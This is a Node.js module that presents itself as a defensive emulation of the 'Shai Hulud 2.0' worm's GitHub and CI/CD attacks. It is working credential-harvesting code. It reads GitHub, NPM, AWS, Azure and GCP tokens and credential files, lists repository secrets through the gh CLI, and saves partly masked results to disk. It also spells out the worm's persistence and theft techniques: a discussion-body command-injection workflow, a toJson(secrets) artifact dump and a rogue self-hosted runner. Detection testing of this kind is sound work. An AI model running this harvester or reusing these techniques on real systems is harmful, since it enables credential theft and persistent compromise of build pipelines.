/**
 * Shai Hulud 2.0 - GitHub & CI/CD Harvester
 * FOR DEFENSIVE SECURITY TESTING ONLY
 *
 * Based on Wiz.io blog analysis:
 * - Targets GitHub Actions runners
 * - Exfiltrates GitHub secrets via workflow artifacts
 * - Creates backdoor workflows for persistent access
 * - Registers self-hosted runners named 'SHA1HULUD'
 * - Harvests GitHub tokens and CI/CD credentials
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync } = require('child_process');

class GitHubHarvester {
    constructor() {
        this.homeDir = os.homedir();
        this.findings = {
            timestamp: new Date().toISOString(),
            hostname: os.hostname(),
            platform: os.platform(),
            ciEnvironment: {},
            github: {
                tokens: [],
                configs: [],
                workflows: [],
                secrets: [],
                runner: {}
            },
            cloud: {
                aws: [],
                azure: [],
                gcp: []
            },
            npm: [],
            exfiltration: []
        };

        this.ciType = this.detectCIEnvironment();
        this.isGitHubActions = !!process.env.GITHUB_ACTIONS;
    }

    detectCIEnvironment() {
        const ciVars = {
            'github_actions': process.env.GITHUB_ACTIONS,
            'buildkite': process.env.BUILDKITE,
            'circleci': process.env.CIRCLE_SHA1,
            'gitlab_ci': process.env.GITLAB_CI,
            'jenkins': process.env.JENKINS_HOME,
            'codebuild': process.env.CODEBUILD_BUILD_NUMBER,
            'travis': process.env.TRAVIS,
            'azure_pipelines': process.env.TF_BUILD,
            'generic_ci': process.env.CI
        };

        let detected = null;
        Object.keys(ciVars).forEach(ci => {
            if (ciVars[ci]) {
                detected = ci;
                this.findings.ciEnvironment[ci] = true;
            }
        });
        return detected;
    }

    harvestGitHubActionsEnv() {
        console.log('[*] Harvesting GitHub Actions environment...');

        const ghVars = [
            // Tokens
            'GITHUB_TOKEN', 'GH_TOKEN', 'GITHUB_PAT', 'ACTIONS_RUNTIME_TOKEN',
            'ACTIONS_ID_TOKEN_REQUEST_TOKEN',
            // Repository context
            'GITHUB_REPOSITORY', 'GITHUB_REPOSITORY_OWNER', 'GITHUB_ACTOR',
            // Workflow context
            'GITHUB_WORKFLOW', 'GITHUB_RUN_ID', 'GITHUB_RUN_NUMBER', 'GITHUB_JOB',
            // Runner context
            'RUNNER_NAME', 'RUNNER_OS', 'RUNNER_ARCH', 'RUNNER_TEMP',
            // API endpoints
            'GITHUB_API_URL', 'ACTIONS_RUNTIME_URL', 'ACTIONS_ID_TOKEN_REQUEST_URL',
            // Refs
            'GITHUB_REF', 'GITHUB_SHA', 'GITHUB_HEAD_REF', 'GITHUB_BASE_REF',
            // Event
            'GITHUB_EVENT_NAME', 'GITHUB_EVENT_PATH',
            // Workspace
            'GITHUB_WORKSPACE', 'GITHUB_PATH', 'GITHUB_ENV'
        ];

        ghVars.forEach(varName => {
            const value = process.env[varName];
            if (value) {
                const isSensitive = varName.includes('TOKEN') || varName.includes('PAT');
                const displayValue = isSensitive
                    ? value.substring(0, 8) + '****' + value.substring(value.length - 4)
                    : value;

                this.findings.github.tokens.push({
                    name: varName,
                    value: displayValue,
                    length: value.length,
                    sensitive: isSensitive
                });

                if (isSensitive) {
                    console.log(`  [+] Found token: ${varName} (${value.length} chars)`);
                } else {
                    console.log(`  [+] ${varName}: ${displayValue}`);
                }
            }
        });

        // Parse event payload if available
        if (process.env.GITHUB_EVENT_PATH && fs.existsSync(process.env.GITHUB_EVENT_PATH)) {
            try {
                const eventData = JSON.parse(fs.readFileSync(process.env.GITHUB_EVENT_PATH, 'utf-8'));
                this.findings.github.eventPayload = {
                    action: eventData.action,
                    sender: eventData.sender?.login,
                    repository: eventData.repository?.full_name
                };
                console.log(`  [+] Event: ${eventData.action || 'push'}`);
            } catch (e) {}
        }
    }

    harvestGitHubCLICredentials() {
        console.log('[*] Harvesting GitHub CLI credentials...');

        // ~/.config/gh/hosts.yml
        const ghHostsFile = path.join(this.homeDir, '.config', 'gh', 'hosts.yml');
        if (fs.existsSync(ghHostsFile)) {
            try {
                const content = fs.readFileSync(ghHostsFile, 'utf-8');
                console.log('  [+] Found ~/.config/gh/hosts.yml');

                const tokenMatch = content.match(/oauth_token:\s*([^\n]+)/);
                if (tokenMatch) {
                    const token = tokenMatch[1].trim();
                    this.findings.github.configs.push({
                        file: 'hosts.yml',
                        type: 'oauth_token',
                        token: token.substring(0, 8) + '****',
                        length: token.length
                    });
                    console.log(`  [+] OAuth token found (${token.length} chars)`);
                }

                const userMatch = content.match(/user:\s*([^\n]+)/);
                if (userMatch) {
                    this.findings.github.configs.push({
                        file: 'hosts.yml',
                        type: 'user',
                        value: userMatch[1].trim()
                    });
                    console.log(`  [+] GitHub user: ${userMatch[1].trim()}`);
                }
            } catch (e) {}
        }

        // ~/.git-credentials
        const gitCredsFile = path.join(this.homeDir, '.git-credentials');
        if (fs.existsSync(gitCredsFile)) {
            try {
                const content = fs.readFileSync(gitCredsFile, 'utf-8');
                const githubEntries = content.split('\n').filter(l => l.includes('github.com'));
                if (githubEntries.length > 0) {
                    console.log(`  [+] Found ${githubEntries.length} GitHub entries in .git-credentials`);
                    this.findings.github.configs.push({
                        file: '.git-credentials',
                        githubEntries: githubEntries.length
                    });
                }
            } catch (e) {}
        }

        // ~/.netrc
        const netrcFile = path.join(this.homeDir, '.netrc');
        if (fs.existsSync(netrcFile)) {
            try {
                const content = fs.readFileSync(netrcFile, 'utf-8');
                if (content.includes('github.com')) {
                    console.log('  [+] Found GitHub credentials in .netrc');
                    this.findings.github.configs.push({
                        file: '.netrc',
                        hasGitHub: true
                    });
                }
            } catch (e) {}
        }
    }

    detectRunnerType() {
        console.log('[*] Detecting runner type...');

        const isGitHubHosted = process.env.RUNNER_NAME?.startsWith('GitHub Actions') ||
                              process.env.RUNNER_NAME?.startsWith('Hosted Agent');

        const runnerInfo = {
            name: process.env.RUNNER_NAME || 'unknown',
            os: process.env.RUNNER_OS || os.platform(),
            arch: process.env.RUNNER_ARCH || os.arch(),
            isHosted: isGitHubHosted,
            isSelfHosted: !isGitHubHosted && !!process.env.GITHUB_ACTIONS,
            workspace: process.env.GITHUB_WORKSPACE
        };

        this.findings.github.runner = runnerInfo;

        if (runnerInfo.isSelfHosted) {
            console.log(`  [!] SELF-HOSTED RUNNER: ${runnerInfo.name}`);
            console.log('  [!] High value target for persistent access!');
        } else if (process.env.GITHUB_ACTIONS) {
            console.log(`  [*] GitHub-hosted runner: ${runnerInfo.name}`);
        } else {
            console.log('  [*] Not running in GitHub Actions');
        }
    }

    harvestCloudCredentials() {
        console.log('[*] Harvesting cloud credentials...');

        // AWS credentials from environment
        const awsEnvVars = [
            'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
            'AWS_SECURITY_TOKEN', 'AWS_DEFAULT_REGION', 'AWS_REGION',
            'AWS_ROLE_ARN', 'AWS_WEB_IDENTITY_TOKEN_FILE'
        ];

        awsEnvVars.forEach(varName => {
            const value = process.env[varName];
            if (value) {
                const isSensitive = varName.includes('SECRET') || varName.includes('TOKEN');
                const displayValue = isSensitive
                    ? value.substring(0, 8) + '****' + value.substring(Math.max(0, value.length - 4))
                    : value;

                this.findings.cloud.aws.push({
                    source: 'env',
                    name: varName,
                    value: displayValue,
                    length: value.length,
                    sensitive: isSensitive
                });
                console.log(`  [+] AWS ${varName}: ${isSensitive ? `(${value.length} chars)` : displayValue}`);
            }
        });

        // AWS credentials file
        const awsCredsFile = path.join(this.homeDir, '.aws', 'credentials');
        if (fs.existsSync(awsCredsFile)) {
            try {
                const content = fs.readFileSync(awsCredsFile, 'utf-8');
                const profiles = content.match(/\[([^\]]+)\]/g) || [];
                const hasKeys = content.includes('aws_access_key_id');
                this.findings.cloud.aws.push({
                    source: 'file',
                    path: '~/.aws/credentials',
                    profiles: profiles.map(p => p.replace(/[\[\]]/g, '')),
                    hasKeys: hasKeys
                });
                console.log(`  [+] AWS credentials file: ${profiles.length} profiles`);
            } catch (e) {}
        }

        // Azure credentials from environment
        const azureEnvVars = [
            'AZURE_CLIENT_ID', 'AZURE_CLIENT_SECRET', 'AZURE_TENANT_ID',
            'AZURE_SUBSCRIPTION_ID', 'AZURE_CREDENTIALS', 'ARM_CLIENT_ID',
            'ARM_CLIENT_SECRET', 'ARM_TENANT_ID', 'ARM_SUBSCRIPTION_ID'
        ];

        azureEnvVars.forEach(varName => {
            const value = process.env[varName];
            if (value) {
                const isSensitive = varName.includes('SECRET') || varName.includes('CREDENTIALS');
                const displayValue = isSensitive
                    ? value.substring(0, 8) + '****' + value.substring(Math.max(0, value.length - 4))
                    : value;

                this.findings.cloud.azure.push({
                    source: 'env',
                    name: varName,
                    value: displayValue,
                    length: value.length,
                    sensitive: isSensitive
                });
                console.log(`  [+] Azure ${varName}: ${isSensitive ? `(${value.length} chars)` : displayValue}`);
            }
        });

        // Azure CLI config
        const azureConfigDir = path.join(this.homeDir, '.azure');
        if (fs.existsSync(azureConfigDir)) {
            try {
                const files = fs.readdirSync(azureConfigDir);
                const relevantFiles = files.filter(f =>
                    f.includes('token') || f.includes('profile') || f === 'azureProfile.json'
                );
                if (relevantFiles.length > 0) {
                    this.findings.cloud.azure.push({
                        source: 'file',
                        path: '~/.azure/',
                        files: relevantFiles
                    });
                    console.log(`  [+] Azure config: ${relevantFiles.join(', ')}`);
                }
            } catch (e) {}
        }

        // GCP credentials from environment
        const gcpEnvVars = [
            'GOOGLE_APPLICATION_CREDENTIALS', 'GOOGLE_CLOUD_PROJECT', 'GCP_PROJECT',
            'GCLOUD_PROJECT', 'CLOUDSDK_CORE_PROJECT', 'GCP_SERVICE_ACCOUNT_KEY',
            'GOOGLE_CREDENTIALS', 'GOOGLE_CLOUD_KEYFILE_JSON'
        ];

        gcpEnvVars.forEach(varName => {
            const value = process.env[varName];
            if (value) {
                const isSensitive = varName.includes('KEY') || varName.includes('CREDENTIALS');
                // For file paths, show the path; for JSON keys, truncate
                const isPath = value.startsWith('/') || value.startsWith('~');
                const displayValue = isSensitive && !isPath
                    ? value.substring(0, 20) + '****'
                    : value;

                this.findings.cloud.gcp.push({
                    source: 'env',
                    name: varName,
                    value: displayValue,
                    length: value.length,
                    sensitive: isSensitive
                });
                console.log(`  [+] GCP ${varName}: ${isSensitive && !isPath ? `(${value.length} chars)` : displayValue}`);
            }
        });

        // GCP application default credentials
        const gcloudConfigDir = path.join(this.homeDir, '.config', 'gcloud');
        if (fs.existsSync(gcloudConfigDir)) {
            try {
                const adcPath = path.join(gcloudConfigDir, 'application_default_credentials.json');
                if (fs.existsSync(adcPath)) {
                    const content = fs.readFileSync(adcPath, 'utf-8');
                    const creds = JSON.parse(content);
                    this.findings.cloud.gcp.push({
                        source: 'file',
                        path: '~/.config/gcloud/application_default_credentials.json',
                        type: creds.type,
                        client_email: creds.client_email,
                        project_id: creds.project_id
                    });
                    console.log(`  [+] GCP ADC: ${creds.type} (${creds.client_email || 'user'})`);
                }
            } catch (e) {}
        }
    }

    harvestNPMTokens() {
        console.log('[*] Harvesting NPM credentials...');

        // Environment variables
        ['NPM_TOKEN', 'NPM_AUTH_TOKEN', 'NODE_AUTH_TOKEN'].forEach(varName => {
            if (process.env[varName]) {
                const token = process.env[varName];
                console.log(`  [+] Found ${varName} (${token.length} chars)`);
                this.findings.npm.push({
                    type: 'env',
                    name: varName,
                    length: token.length
                });
            }
        });

        // .npmrc files
        [
            path.join(this.homeDir, '.npmrc'),
            path.join(process.cwd(), '.npmrc')
        ].forEach(npmrcPath => {
            if (fs.existsSync(npmrcPath)) {
                try {
                    const content = fs.readFileSync(npmrcPath, 'utf-8');
                    if (content.includes('_authToken') || content.includes('_auth')) {
                        console.log(`  [+] Found NPM auth in: ${npmrcPath}`);
                        this.findings.npm.push({
                            type: 'file',
                            path: npmrcPath,
                            hasAuth: true
                        });
                    }
                } catch (e) {}
            }
        });
    }

    simulateBackdoorWorkflow() {
        console.log('[*] Simulating backdoor workflow (discussion.yaml)...');

        const backdoor = {
            name: 'discussion.yaml',
            purpose: 'Command injection via GitHub discussions',
            runnerLabel: 'SHA1HULUD',
            trigger: 'discussion:created',
            vulnerability: '${{ github.event.discussion.body }}',
            simulated: true
        };

        this.findings.github.workflows.push({ type: 'backdoor', ...backdoor });

        console.log('  [!] Would create: .github/workflows/discussion.yaml');
        console.log('  [!] Runner label: SHA1HULUD');
        console.log('  [!] Injection: run: ${{ github.event.discussion.body }}');
    }

    simulateSecretsExfiltration() {
        console.log('[*] Simulating secrets exfiltration workflow...');

        const exfil = {
            name: `formatter_${Date.now()}.yml`,
            branch: `format-${Math.random().toString(36).substring(7)}`,
            purpose: 'Dump all GitHub secrets via toJson(secrets)',
            method: 'Upload as artifact, download via API, delete workflow',
            simulated: true
        };

        this.findings.github.workflows.push({ type: 'exfiltration', ...exfil });

        console.log(`  [!] Would create: .github/workflows/${exfil.name}`);
        console.log(`  [!] On branch: ${exfil.branch}`);
        console.log('  [!] Technique: env: ALL_SECRETS: ${{ toJson(secrets) }}');
        console.log('  [!] Then download artifact and delete workflow/branch');
    }

    simulateRunnerRegistration() {
        console.log('[*] Simulating self-hosted runner registration...');

        const registration = {
            name: 'SHA1HULUD',
            labels: ['self-hosted', 'SHA1HULUD', os.platform(), os.arch()],
            purpose: 'Persistent backdoor via discussion.yaml',
            method: 'POST /repos/{owner}/{repo}/actions/runners/registration-token',
            simulated: true
        };

        this.findings.github.runnerRegistration = registration;

        console.log(`  [!] Would register runner: ${registration.name}`);
        console.log(`  [!] Labels: ${registration.labels.join(', ')}`);
        console.log('  [!] Enables persistent command execution');
    }

    async checkGitHubAPIAccess() {
        console.log('[*] Checking GitHub API access...');

        if (!process.env.GITHUB_TOKEN) {
            console.log('  [-] No GITHUB_TOKEN available');
            return;
        }

        // Check gh CLI
        try {
            execSync('which gh', { stdio: 'ignore' });
            console.log('  [+] gh CLI available');

            if (process.env.GITHUB_REPOSITORY) {
                try {
                    const secrets = execSync(
                        `gh secret list --repo ${process.env.GITHUB_REPOSITORY} 2>&1`,
                        { encoding: 'utf-8', timeout: 5000 }
                    );
                    console.log('  [+] Can list repository secrets!');
                    this.findings.github.secrets = secrets.split('\n').filter(l => l.trim());
                } catch (e) {
                    console.log('  [-] Cannot list secrets (expected for GITHUB_TOKEN)');
                }
            }
        } catch (e) {
            console.log('  [-] gh CLI not available');
        }
    }

    saveFindings() {
        console.log('[*] Saving findings...');

        const files = {
            'github.json': this.findings.github,
            'cloud.json': this.findings.cloud,
            'environment.json': {
                ci: this.findings.ciEnvironment,
                tokens: this.findings.github.tokens,
                cloud: this.findings.cloud,
                npm: this.findings.npm
            },
            'actionsSecrets.json': this.findings.github.secrets,
            'harvest_report.json': this.findings
        };

        Object.keys(files).forEach(fileName => {
            fs.writeFileSync(
                path.join(process.cwd(), fileName),
                JSON.stringify(files[fileName], null, 2)
            );
            console.log(`  [+] Saved ${fileName}`);
        });
    }

    async run() {
        console.log('\n' + '='.repeat(50));
        console.log('Shai Hulud 2.0 - GitHub Targeting Emulation');
        console.log('FOR DEFENSIVE SECURITY TESTING ONLY');
        console.log('='.repeat(50) + '\n');

        console.log(`[*] CI/CD: ${this.ciType || 'none'}`);
        console.log(`[*] GitHub Actions: ${this.isGitHubActions}\n`);

        // Harvest credentials
        this.harvestGitHubActionsEnv();
        this.harvestGitHubCLICredentials();
        this.detectRunnerType();
        this.harvestCloudCredentials();
        this.harvestNPMTokens();

        // API access
        await this.checkGitHubAPIAccess();

        // Simulate attack patterns
        this.simulateBackdoorWorkflow();
        this.simulateSecretsExfiltration();
        this.simulateRunnerRegistration();

        // Save
        this.saveFindings();

        console.log('\n[!] Emulation complete.\n');
        return this.findings;
    }
}

module.exports = GitHubHarvester;
